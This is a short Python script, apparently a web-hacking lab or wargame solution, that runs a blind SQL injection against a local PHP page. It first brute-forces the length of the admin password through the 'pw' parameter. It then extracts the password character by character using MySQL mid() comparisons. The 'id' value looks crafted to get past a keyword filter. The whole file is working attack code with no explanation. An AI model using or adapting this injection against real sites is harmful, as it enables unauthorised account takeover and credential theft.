import os
import requests

os.environ['NO_PROXY'] = '127.0.0.1'
url="http://localhost/web%20hacking/index1.php"

length=1
while True:
    query="?id=adadminmin&pw=%27%20||%20id=%27admin%27%20%26%26%20length(pw)="+str(length)+"%23"
    result=requests.get(url+query)
    if("You got the results!" in result.text):
        print("password length:", length)
        break
    print(length)
    length+=1

pw=""
for i in range(1, length+1):
    for ch in range(48, 123):
        if (58 <= ch <= 96): continue
        query="?id=adadminmin&pw=%27%20||%20id=%27admin%27%20%26%26%20mid(pw,"+str(i)+",1)='"+chr(ch)+"'%23"
        result=requests.get(url+query)
        if("You got the results!" in result.text):
            pw+=chr(ch)
            print(pw)
            break
print("admin password:",pw)
